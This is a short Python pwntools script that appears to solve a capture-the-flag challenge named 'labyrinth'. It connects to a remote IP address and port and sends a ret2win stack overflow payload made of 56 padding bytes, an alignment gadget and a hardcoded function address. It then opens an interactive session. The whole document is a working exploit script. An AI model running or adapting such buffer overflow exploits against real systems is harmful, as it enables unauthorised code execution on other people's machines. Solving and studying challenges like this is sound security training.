#!/usr/bin/python
import sys
import struct
from pwn import *

context.log_level = 'error'

e = ELF("./labyrinth")
libc = ELF("./glibc/libc.so.6")
# p = process(e.path)
# p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())
p = remote('83.136.251.195', 42661)

ret = p64(0x401016)

print(f"Received: {p.recvuntil(b'>> ')}")

# lol
p.sendline(b'69')
print(f"Received: {p.recvuntil(b'>> ')}")

# ret2win function
escape_plan = p64(0x401255)

payload = b'A'*56

# for alignment
payload += ret

# ret2win function
payload += escape_plan

p.sendline(payload)
p.interactive()
